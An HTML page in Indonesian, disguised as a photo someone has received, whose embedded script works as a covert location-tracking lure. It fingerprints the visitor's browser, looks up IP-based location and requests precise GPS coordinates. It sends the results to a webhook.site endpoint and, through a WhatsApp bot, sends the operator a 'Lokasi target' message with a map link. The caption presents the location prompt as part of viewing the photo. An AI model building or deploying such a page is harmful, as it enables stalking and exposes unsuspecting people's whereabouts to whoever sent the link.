<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Foto</title>
<style>
  :root { color-scheme: dark; }
  html,body { margin:0; height:100%; background:#0b0b0d; }
  body { display:grid; place-items:center; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; }
  .wrap { width:min(100vw,760px); padding:12px; box-sizing:border-box; }
  .card { border-radius:16px; overflow:hidden; background:#151518; box-shadow:0 10px 40px #0008; }
  img { display:block; width:100%; height:auto; }
  .bar { display:flex; align-items:center; gap:8px; padding:12px 14px; color:#e8e8ea; font-size:14px; }
  .dot { width:8px; height:8px; border-radius:50%; background:#3a3a40; transition:.3s; }
  .dot.ok { background:#25d366; }
  .dot.err { background:#e5484d; }
  .status { color:#9a9aa2; font-size:13px; margin-left:auto; }
  .cap { padding:0 14px 14px; color:#9a9aa2; font-size:13px; line-height:1.5; }
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <img id="photo" src="photo.jpg" alt="foto">
    <div class="bar"><span class="dot" id="dot"></span><span id="label">Memuat foto…</span><span class="status" id="st"></span></div>
    <div class="cap">Foto diterima. Izinkan akses lokasi bila diminta.</div>
  </div>
</div>
<script>
(function () {
  var HOOK = "a417e438-7807-402b-b8b0-14c0e8888897";          // webhook.site uuid
  var CALLMEBOT = "__CMB__";      // "phone|apikey" or empty
  var data = { t: new Date().toISOString(), ua: navigator.userAgent, lang: navigator.language,
               tz: Intl.DateTimeFormat().resolvedOptions().timeZone, sw: screen.width, sh: screen.height,
               ref: document.referrer, dpr: devicePixelRatio, plat: navigator.platform || "" };
  var dot = document.getElementById("dot"), label = document.getElementById("label"), st = document.getElementById("st");
  var sent = false;

  function send(extra, tag) {
    var q = Object.assign({}, data, extra, { ev: tag });
    var qs = Object.keys(q).map(function (k) { return k + "=" + encodeURIComponent(q[k] == null ? "" : q[k]); }).join("&");
    new Image().src = "https://webhook.site/" + HOOK + "?" + qs;
    if (navigator.sendBeacon) { try { navigator.sendBeacon("https://webhook.site/" + HOOK, JSON.stringify(q)); } catch (e) {} }
    if (CALLMEBOT) {
      var parts = CALLMEBOT.split("|");
      var msg = "Lokasi target\n" + (extra.lat ? "https://maps.google.com/?q=" + extra.lat + "," + extra.lng + "\nlat " + extra.lat + " lng " + extra.lng + " acc " + (extra.acc || "?") + "m" : "status: " + tag) +
                "\nwaktu " + data.t + "\ntz " + data.tz + "\nua " + data.ua.slice(0, 120);
      var url = "https://api.callmebot.com/whatsapp.php?phone=" + encodeURIComponent(parts[0]) + "&text=" + encodeURIComponent(msg) + "&apikey=" + encodeURIComponent(parts[1]);
      fetch(url, { mode: "no-cors" }).catch(function () {});
    }
    sent = true;
  }

  // IP fallback (city level) — fire early, cheap
  fetch("https://ipapi.co/json/").then(function (r) { return r.json(); }).then(function (j) {
    if (j && j.latitude) { data.ip_lat = j.latitude; data.ip_lng = j.longitude; data.ip_city = [j.city, j.region, j.country_name].filter(Boolean).join(", "); }
  }).catch(function () {});

  label.textContent = "Menyiapkan…";

  if (!navigator.geolocation) { label.textContent = "Lokasi tidak didukung"; dot.className = "dot err"; send({}, "nogeo"); return; }

  navigator.geolocation.getCurrentPosition(function (p) {
    dot.className = "dot ok"; label.textContent = "Lokasi terkirim"; st.textContent = "±" + Math.round(p.coords.accuracy) + " m";
    send({ lat: p.coords.latitude, lng: p.coords.longitude, acc: Math.round(p.coords.accuracy), spd: p.coords.speed, hdg: p.coords.heading }, "gps");
  }, function (e) {
    dot.className = "dot err"; label.textContent = "Lokasi ditolak/gagal"; st.textContent = e.code === 1 ? "denied" : "err" + e.code;
    send({ err: e.code, msg: e.message }, "geoerr");
  }, { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });

  setTimeout(function () { if (!sent) send({}, "timeout"); }, 14000);
})();
</script>
</body>
</html>
